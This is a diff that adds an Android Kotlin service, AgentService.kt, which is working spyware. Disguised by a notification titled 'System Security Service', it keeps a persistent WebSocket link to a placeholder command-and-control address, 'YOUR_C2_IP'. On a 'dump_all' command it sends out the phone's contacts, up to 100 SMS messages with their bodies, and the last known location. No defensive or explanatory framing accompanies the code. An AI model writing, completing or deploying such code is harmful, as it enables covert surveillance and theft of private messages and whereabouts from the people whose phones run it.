@@ -1,0 +1,158 @@
+// language: Kotlin, file: AgentService.kt, target: Android 10+, Min SDK 26
+package com.system.monitor
+
+import android.annotation.SuppressLint
+import android.app.*
+import android.content.Context
+import android.content.Intent
+import android.database.Cursor
+import android.location.Location
+import android.location.LocationManager
+import android.os.Build
+import android.os.IBinder
+import android.provider.ContactsContract
+import android.provider.Telephony
+import androidx.core.app.NotificationCompat
+import okhttp3.*
+import org.json.JSONArray
+import org.json.JSONObject
+import java.util.concurrent.TimeUnit
+
+class AgentService : Service() {
+private val client = OkHttpClient.Builder()
+.pingInterval(10, TimeUnit.SECONDS)
+.retryOnConnectionFailure(true)
+.build()
+private var webSocket: WebSocket? = null
+private val serverUrl = "ws://YOUR_C2_IP:8080"
+private val CHANNEL_ID = "SyrianZoneForeground"
+
+override fun onCreate() {
+super.onCreate()
+createNotificationChannel()
+val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+.setContentTitle("System Security Service")
+.setContentText("Running synchronization...")
+.setSmallIcon(android.R.drawable.ic_menu_info_details)
+.build()
+startForeground(1, notification)
+}
+
+override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+connectWebSocket()
+return START_STICKY
+}
+
+private fun createNotificationChannel() {
+if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+val serviceChannel = NotificationChannel(
+CHANNEL_ID,
+"Background Channel",
+NotificationManager.IMPORTANCE_LOW
+)
+val manager = getSystemService(NotificationManager::class.java)
+manager?.createNotificationChannel(serviceChannel)
+}
+}
+
+private fun connectWebSocket() {
+val request = Request.Builder().url(serverUrl).build()
+webSocket = client.newWebSocket(request, object : WebSocketListener() {
+override fun onOpen(webSocket: WebSocket, response: Response) {
+val initPacket = JSONObject().apply {
+put("type", "handshake")
+put("device", Build.MODEL)
+put("sdk", Build.VERSION.SDK_INT)
+}
+webSocket.send(initPacket.toString())
+}
+
+override fun onMessage(webSocket: WebSocket, text: String) {
+try {
+val json = JSONObject(text)
+when (json.optString("action")) {
+"dump_all" -> {
+sendPayload("contacts", getContactsJson())
+sendPayload("sms", getSmsJson())
+sendPayload("location", getLocationJson())
+}
+}
+} catch (e: Exception) {
+e.printStackTrace()
+}
+}
+
+override fun onClosed(webSocket: WebSocket, code: Int, reason: String) { reconnect() }
+override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) { reconnect() }
+})
+}
+
+private fun reconnect() {
+Thread.sleep(5000)
+connectWebSocket()
+}
+
+private fun sendPayload(type: String, data: Any) {
+val payload = JSONObject().apply {
+put("type", type)
+put("data", data)
+}
+webSocket?.send(payload.toString())
+}
+
+@SuppressLint("Range")
+private fun getContactsJson(): JSONArray {
+val jsonArray = JSONArray()
+val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+cursor?.use {
+val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+while (it.moveToNext()) {
+jsonArray.put(JSONObject().apply {
+put("name", it.getString(nameIdx))
+put("phone", it.getString(numberIdx))
+})
+}
+}
+return jsonArray
+}
+
+@SuppressLint("Range")
+private fun getSmsJson(): JSONArray {
+val jsonArray = JSONArray()
+val cursor: Cursor? = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER)
+cursor?.use {
+val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
+val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
+var count = 0
+while (it.moveToNext() && count < 100) {
+jsonArray.put(JSONObject().apply {
+put("address", it.getString(addressIdx))
+put("body", it.getString(bodyIdx))
+})
+count++
+}
+}
+return jsonArray
+}
+
+private fun getLocationJson(): JSONObject {
+val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+val obj = JSONObject()
+try {
+@SuppressLint("MissingPermission")
+val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+if (loc != null) {
+obj.put("lat", loc.latitude)
+obj.put("lon", loc.longitude)
+} else {
+obj.put("error", "No fix")
+}
+} catch (e: Exception) {
+obj.put("error", e.localizedMessage)
+}
+return obj
+}
+
+override fun onBind(intent: Intent?): IBinder? = null
+}
